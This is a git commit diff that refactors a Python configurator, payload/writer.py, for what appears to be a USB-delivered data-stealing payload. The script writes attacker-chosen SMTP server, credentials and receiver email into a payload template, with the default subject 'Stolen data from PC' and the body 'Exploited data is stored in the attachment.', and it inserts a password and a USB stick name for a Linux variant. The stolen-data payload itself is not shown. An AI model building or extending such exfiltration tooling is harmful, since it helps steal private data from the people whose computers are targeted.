463bd7d8bd4a160b25ed9db39e4bd0a7d991f76e
AleksaMCode <aleksamcode@gmail.com>
2023-09-26 15:40:05 +0200

    Refactor code

--- payload/writer.py
+++ payload/writer.py
@@ -4,90 +4,56 @@ ARGS = sys.argv[1:]
 SYSTEM_LIST = ["windows", "linux"]
 
 
+def process_insert_win(payload_line, display_msg, field_name, default_value=None):
+    value = input(display_msg % default_value if default_value else display_msg)
+    return payload_line.replace(f"{field_name}", default_value if value == "" else value)
+
+
+def process_insert_lnx(payload_line, display_msg, field_name):
+    while True:
+        value = input(display_msg)
+        if value != "":
+            return payload_line.replace(f"{field_name}", value), value
+
+
 def windows_writer():
     payload = []
     try:
-        payload = open(ARGS[1], 'r').readlines()
-        SMTP_SERVER = "smtp.mail.yahoo.com"
-        SMTP_PORT = 587
-        EMAIL_SUBJECT = "Stolen data from PC"
-        EMAIL_BODY = "Exploited data is stored in the attachment."
+        with open(ARGS[1], 'r') as f:
+            payload = f.readlines()
 
-        value = input(f"Select a SMTP server (default '{SMTP_SERVER}'): ")
-        if value == "":
-            value = SMTP_SERVER
-        payload[30] = payload[30].replace("SMTP_SERVER", value)
-
-        value = input(f"Select a SMTP server port (default '{SMTP_PORT}'): ")
-        if value == "":
-            value = SMTP_PORT
-        payload[30] = payload[30].replace("SMTP_PORT", value)
-
-        done = False
-        while not done:
-            value = input(f"Select a SMTP server password: ")
-            if value != "":
-                payload[30] = payload[30].replace("SMTP_PASSWORD", value)
-                done = True
-
-        done = False
-        while not done:
-            value = input(f"Select a SMTP server email: ")
-            if value != "":
-                payload[30] = payload[30].replace("SENDER_EMAIL", value)
-                done = True
-
-        done = False
-        while not done:
-            value = input(f"Select a receiver email: ")
-            if value != "":
-                payload[30] = payload[30].replace("RECEIVER_EMAIL", value)
-                done = True
-
-        value = input(f"Select an email subject (default '{EMAIL_SUBJECT}'): ")
-        if value == "":
-            value = EMAIL_SUBJECT
-        payload[30] = payload[30].replace("EMAIL_SUBJECT", value)
-
-        value = input(f"Select an email body (default '{EMAIL_BODY}'): ")
-        if value == "":
-            value = EMAIL_BODY
-        payload[30] = payload[30].replace("EMAIL_BODY", value)
+        payload[30] = process_insert_win(payload[30], "Select a SMTP server (default '%s'): ", "SMTP_SERVER",
+                                         "smtp.mail.yahoo.com")
+        payload[30] = process_insert_win(payload[30], "Select a SMTP server port (default '%s'): ", "SMTP_PORT", "587")
+        payload[30] = process_insert_win(payload[30], "Select a SMTP server password: ", "SMTP_PASSWORD")
+        payload[30] = process_insert_win(payload[30], "Select a SMTP server email: ", "SENDER_EMAIL")
+        payload[30] = process_insert_win(payload[30], "Select a receiver email: ", "RECEIVER_EMAIL")
+        payload[30] = process_insert_win(payload[30], "Select an email subject (default '%s'): ", "EMAIL_SUBJECT",
+                                         "Stolen data from PC")
+        payload[30] = process_insert_win(payload[30], "Select an email body (default '%s'): ", "EMAIL_BODY",
+                                         "Exploited data is stored in the attachment.")
     except FileNotFoundError:
         exit(f"File '{ARGS[1]}' is missing.")
 
     with open(ARGS[1], 'w') as f:
-        for line in payload:
-            f.write(line)
+        f.write(''.join(payload))
 
 
 def linux_writer():
     payload = []
-
     try:
-        payload = open(ARGS[1], 'r').readlines()
+        with open(ARGS[1], 'r') as f:
+            payload = f.readlines()
 
-        done = False
-        while not done:
-            value = input(f"Select you password: ")
-            if value != "":
-                payload[6] = payload[6].replace("PASSWORD", value)
-                payload[8] = payload[8].replace("PASSWORD", value)
-                done = True
-
-        done = False
-        while not done:
-            value = input(f"Select you USB stick name: ")
-            if value != "":
-                payload[2] = payload[2].replace("USBSTICK", value)
-                payload[10] = payload[10].replace("USBSTICK", value)
-                done = True
+        payload[6], value = process_insert_lnx(payload[6], "Select you password: ", "PASSWORD")
+        payload[8] = payload[8].replace("PASSWORD", value)
+        payload[2], value = process_insert_lnx(payload[2], "Select you USB stick name: ", "USBSTICK")
+        payload[10] = payload[10].replace("USBSTICK", value)
     except FileNotFoundError:
         exit(f"File '{ARGS[1]}' is missing.")
 
     with open(ARGS[1], 'w') as f:
-        for line in payload:
-            f.write(line)
+        f.write(''.join(payload))
 
 
 if not ARGS or len(ARGS) != 2 or ARGS[0] not in SYSTEM_LIST:
